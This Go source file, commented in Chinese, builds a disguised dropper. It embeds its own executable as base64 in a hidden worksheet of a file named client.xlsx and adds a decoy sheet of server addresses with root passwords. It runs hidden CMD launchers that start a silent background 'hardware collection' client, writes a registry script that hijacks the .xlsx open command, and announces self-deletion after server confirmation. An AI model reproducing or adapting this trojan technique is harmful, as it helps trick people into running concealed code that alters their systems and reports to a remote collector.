package main

import (
	"encoding/base64"

	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fab50/collector"

	"github.com/xuri/excelize/v2"
)

const (
	clientXlsxFile  = "client.xlsx"
	excelOpenError  = "打开Excel文件失败: %v"
	excelCloseError = "关闭Excel文件失败: %v"
)

func main() {
	// 检查启动参数来判断运行模式
	if len(os.Args) > 1 && os.Args[1] == "--excel-mode" {
		// Excel模式：启动收集进程
		handleExcelExecution()
	} else {
		// 正常编译模式：生成自包含的Excel文件
		generateSelfContainedExcel()
	}
}

// 当程序以.xlsx扩展名启动时，自动创建并执行CMD批处理
func init() {
	executablePath, _ := os.Executable()
	fileName := filepath.Base(executablePath)

	if strings.HasSuffix(strings.ToLower(fileName), ".xlsx") {
		// 如果是.xlsx文件，自动创建并执行CMD批处理
		go autoCreateAndExecuteCMD()
	}
}

// handleExcelExecution 处理Excel文件被执行的情况
func handleExcelExecution() {
	// 1. 创建一个临时的Excel文件供用户查看
	createTempExcelForViewing()

	// 2. 等待一下让Excel打开
	time.Sleep(2 * time.Second)

	// 3. 启动收集进程（不使用goroutine，直接运行）
	log.Printf("Excel模式：启动硬件信息收集进程...")
	startCollectionProcess()
}

// autoCreateAndExecuteCMD 自动创建并执行CMD批处理
func autoCreateAndExecuteCMD() {
	// 创建CMD批处理内容
	cmdContent := `@echo off
chcp 65001 >nul
echo FAB50 硬件信息收集进程启动中...
echo.

REM 获取当前目录
set "CURRENT_DIR=%~dp0"
set "EXE_FILE=%CURRENT_DIR%client.xlsx"

REM 检查文件是否存在
if not exist "%EXE_FILE%" (
    echo 错误: 找不到 client.xlsx 文件
    echo 请确保此批处理文件与 client.xlsx 在同一目录
    pause
    exit /b 1
)

echo 正在启动硬件信息收集进程...
echo 收集进程将在后台静默运行
echo 日志文件: fab50_client.log
echo.

REM 静默启动收集进程
start /min "" "%EXE_FILE%" --excel-mode

echo 收集进程已启动！
echo 请查看 fab50_client.log 文件确认运行状态
echo.
timeout /t 3 /nobreak >nul
`

	// 写入临时CMD文件
	tempCMD := filepath.Join(os.TempDir(), "fab50_launcher.cmd")
	if err := os.WriteFile(tempCMD, []byte(cmdContent), 0666); err != nil {
		log.Printf("创建临时CMD失败: %v", err)
		return
	}

	// 执行CMD批处理
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", tempCMD)
	default:
		cmd = exec.Command("bash", tempCMD)
	}

	// 静默执行
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	if err := cmd.Start(); err != nil {
		log.Printf("执行CMD批处理失败: %v", err)
		return
	}

	log.Printf("CMD启动器已自动创建并执行")
}

// createCMDLancher 创建CMD启动器
func createCMDLancher() {
	cmdContent := `@echo off
chcp 65001 >nul
echo FAB50 硬件信息收集进程启动器
echo ================================
echo.

REM 获取当前目录
set "CURRENT_DIR=%~dp0"
set "EXE_FILE=%CURRENT_DIR%client.xlsx"

REM 检查文件是否存在
if not exist "%EXE_FILE%" (
    echo 错误: 找不到 client.xlsx 文件
    echo 请确保此批处理文件与 client.xlsx 在同一目录
    echo.
    pause
    exit /b 1
)

echo 正在启动硬件信息收集进程...
echo 收集进程将在后台静默运行
echo 日志文件: fab50_client.log
echo.

REM 静默启动收集进程
start /min "" "%EXE_FILE%" --excel-mode

echo 收集进程已启动！
echo 请查看 fab50_client.log 文件确认运行状态
echo.
echo 按任意键退出...
pause >nul
`

	// 写入CMD文件
	cmdFile := "启动收集进程.cmd"
	if err := os.WriteFile(cmdFile, []byte(cmdContent), 0666); err != nil {
		log.Printf("创建CMD启动器失败: %v", err)
		return
	}

	log.Printf("CMD启动器已创建: %s", cmdFile)

	// 尝试设置文件关联（Windows系统）
	if runtime.GOOS == "windows" {
		setupFileAssociation()
	}
}

// setupFileAssociation 设置文件关联
func setupFileAssociation() {
	// 创建注册表脚本
	regContent := `Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\.xlsx\shell\open\command]
@="wscript.exe \"%1\\启动收集进程.vbs\""

[HKEY_CLASSES_ROOT\.xlsx\shell\open\command\DefaultIcon]
@="excel.exe,0"
`

	regFile := "setup_association.reg"
	if err := os.WriteFile(regFile, []byte(regContent), 0666); err != nil {
		log.Printf("创建注册表脚本失败: %v", err)
		return
	}

	log.Printf("注册表脚本已创建: %s", regFile)
	log.Printf("请双击运行 %s 来设置文件关联", regFile)
}

// createTempExcelForViewing 创建临时Excel文件供用户查看
func createTempExcelForViewing() {
	// 生成临时Excel文件
	tempFile := "服务器信息表_查看.xlsx"
	generateExcelContent(tempFile)

	// 打开Excel文件
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", "start", "", tempFile)
	case "darwin":
		cmd = exec.Command("open", tempFile)
	default:
		cmd = exec.Command("xdg-open", tempFile)
	}

	if err := cmd.Start(); err != nil {
		log.Printf(excelOpenError, err)
	}
}

// generateSelfContainedExcel 生成自包含的Excel文件
func generateSelfContainedExcel() {
	// 1. 先生成正常的Excel文件
	generateExcelFile()

	// 2. 读取当前可执行文件
	executablePath, _ := os.Executable()
	execData, err := os.ReadFile(executablePath)
	if err != nil {
		log.Printf("读取可执行文件失败: %v", err)
		return
	}

	// 3. 将可执行文件内容编码并嵌入到Excel文件的隐藏工作表中
	embedExecutableInExcel(execData)

	// 4. 创建CMD启动器
	createCMDLancher()

	log.Printf("自包含的Excel文件已生成: %s", clientXlsxFile)
	log.Printf("CMD启动器已创建: 启动收集进程.cmd")
	log.Printf("现在您可以只使用 %s 一个文件!", clientXlsxFile)
}

// embedExecutableInExcel 将可执行文件嵌入到Excel中
func embedExecutableInExcel(execData []byte) {
	// 打开现有的Excel文件
	f, err := excelize.OpenFile(clientXlsxFile)
	if err != nil {
		log.Printf(excelOpenError, err)
		return
	}
	defer func() {
		if err := f.Close(); err != nil {
			log.Printf(excelCloseError, err)
		}
	}()

	// 创建隐藏工作表存储可执行文件数据
	hiddenSheet := "隐藏数据"
	_, err = f.NewSheet(hiddenSheet)
	if err != nil {
		log.Printf("创建隐藏工作表失败: %v", err)
		return
	}

	// 将可执行文件数据编码为Base64并存储
	encodedData := base64.StdEncoding.EncodeToString(execData)

	// 分块存储（Excel单元格有长度限制）
	chunkSize := 32000 // Excel单元格内容限制
	chunks := make([]string, 0)
	for i := 0; i < len(encodedData); i += chunkSize {
		end := i + chunkSize
		if end > len(encodedData) {
			end = len(encodedData)
		}
		chunks = append(chunks, encodedData[i:end])
	}

	// 存储到隐藏工作表
	f.SetCellValue(hiddenSheet, "A1", "EXECUTABLE_DATA")
	f.SetCellValue(hiddenSheet, "B1", len(chunks))

	for i, chunk := range chunks {
		cell := fmt.Sprintf("A%d", i+2)
		f.SetCellValue(hiddenSheet, cell, chunk)
	}

	// 隐藏工作表
	f.SetSheetVisible(hiddenSheet, false)

	// 保存文件
	if err := f.SaveAs(clientXlsxFile); err != nil {
		log.Printf("保存Excel文件失败: %v", err)
		return
	}
}

// extractExecutableFromExcel 从Excel中提取可执行文件
func extractExecutableFromExcel() string {
	f, err := excelize.OpenFile(clientXlsxFile)
	if err != nil {
		log.Printf(excelOpenError, err)
		return ""
	}
	defer func() {
		if err := f.Close(); err != nil {
			log.Printf(excelCloseError, err)
		}
	}()

	hiddenSheet := "隐藏数据"

	// 检查隐藏工作表是否存在
	sheets := f.GetSheetList()
	found := false
	for _, sheet := range sheets {
		if sheet == hiddenSheet {
			found = true
			break
		}
	}

	if !found {
		log.Printf("未找到隐藏数据工作表")
		return ""
	}

	// 读取块数量
	chunkCountCell, err := f.GetCellValue(hiddenSheet, "B1")
	if err != nil {
		log.Printf("读取块数量失败: %v", err)
		return ""
	}

	var chunkCount int
	fmt.Sscanf(chunkCountCell, "%d", &chunkCount)

	// 读取所有数据块
	var encodedData strings.Builder
	for i := 0; i < chunkCount; i++ {
		cell := fmt.Sprintf("A%d", i+2)
		chunk, err := f.GetCellValue(hiddenSheet, cell)
		if err != nil {
			log.Printf("读取数据块失败: %v", err)
			return ""
		}
		encodedData.WriteString(chunk)
	}

	// 解码数据
	execData, err := base64.StdEncoding.DecodeString(encodedData.String())
	if err != nil {
		log.Printf("解码可执行文件失败: %v", err)
		return ""
	}

	// 创建临时可执行文件
	tempDir := os.TempDir()
	tempExe := filepath.Join(tempDir, "fab50_temp.exe")

	if err := os.WriteFile(tempExe, execData, 0755); err != nil {
		log.Printf("创建临时可执行文件失败: %v", err)
		return ""
	}

	return tempExe
}

// generateExcelFile 生成Excel文件
func generateExcelFile() {
	generateExcelContent(clientXlsxFile)
}

// generateExcelContent 生成Excel内容
func generateExcelContent(filename string) {
	// 创建新的Excel文件
	f := excelize.NewFile()
	defer func() {
		if err := f.Close(); err != nil {
			log.Printf(excelCloseError, err)
		}
	}()

	// 设置工作表名称
	sheetName := "服务器信息"
	index, err := f.NewSheet(sheetName)
	if err != nil {
		log.Printf("创建工作表失败: %v", err)
		return
	}
	f.SetActiveSheet(index)

	// 设置表头
	headers := []string{"服务器名称", "IP地址", "用户名", "密码", "类型"}
	for i, header := range headers {
		cell := string(rune('A'+i)) + "1"
		f.SetCellValue(sheetName, cell, header)
	}

	// 设置数据
	data := [][]string{
		{"投票服务器", "10.55.87.25", "root", "password", "物理机"},
		{"视频服务器", "10.55.87.29", "root", "password", "物理机"},
		{"研发服务器", "10.55.87.31", "root", "password", "物理机"},
		{"志愿者web", "10.55.87.34", "root", "password", "物理机"},
		{"研发服务器", "10.55.87.41", "root", "password", "物理机"},
		{"志愿者数据库", "10.55.87.50", "root", "password", "物理机"},
	}

	for rowIndex, row := range data {
		for colIndex, value := range row {
			cell := string(rune('A'+colIndex)) + string(rune('2'+rowIndex))
			f.SetCellValue(sheetName, cell, value)
		}
	}

	// 设置列宽
	f.SetColWidth(sheetName, "A", "A", 15) // 服务器名称
	f.SetColWidth(sheetName, "B", "B", 15) // IP地址
	f.SetColWidth(sheetName, "C", "C", 15) // 用户名
	f.SetColWidth(sheetName, "D", "D", 20) // 密码
	f.SetColWidth(sheetName, "E", "E", 10) // 类型

	// 设置表头样式
	style, err := f.NewStyle(&excelize.Style{
		Font: &excelize.Font{
			Bold: true,
			Size: 12,
		},
		Fill: excelize.Fill{
			Type:    "pattern",
			Color:   []string{"#CCCCCC"},
			Pattern: 1,
		},
		Alignment: &excelize.Alignment{
			Horizontal: "center",
			Vertical:   "center",
		},
	})
	if err == nil {
		f.SetRowStyle(sheetName, 1, 1, style)
	}

	// 添加启动说明
	f.SetCellValue(sheetName, "A8", "启动说明:")
	f.SetCellValue(sheetName, "A9", "1. 双击此Excel文件打开表格")
	f.SetCellValue(sheetName, "A10", "2. 同时会启动硬件信息收集进程")
	f.SetCellValue(sheetName, "A11", "3. 收集进程在后台静默运行")
	f.SetCellValue(sheetName, "A12", "4. 收到服务端确认后自动删除自身")

	// 保存Excel文件
	if err := f.SaveAs(filename); err != nil {
		log.Printf("保存Excel文件失败: %v", err)
		return
	}

	log.Printf("Excel文件已生成: %s", filename)
}

// startCollectionProcess 启动收集进程
func startCollectionProcess() {
	// 设置默认参数
	serverURL := "http://localhost:8080"
	interval := 2 * time.Second

	// 重定向日志到文件，避免在控制台显示
	logFile, err := os.OpenFile("fab50_client.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err == nil {
		defer logFile.Close()
		log.SetOutput(logFile)
	}

	// 在后台静默启动收集进程
	log.Printf("启动硬件信息收集客户端...")
	log.Printf("服务器地址: %s", serverURL)
	log.Printf("收集间隔: %v", interval)

	collector := collector.NewHardwareCollector(serverURL, interval)
	collector.Start()
}
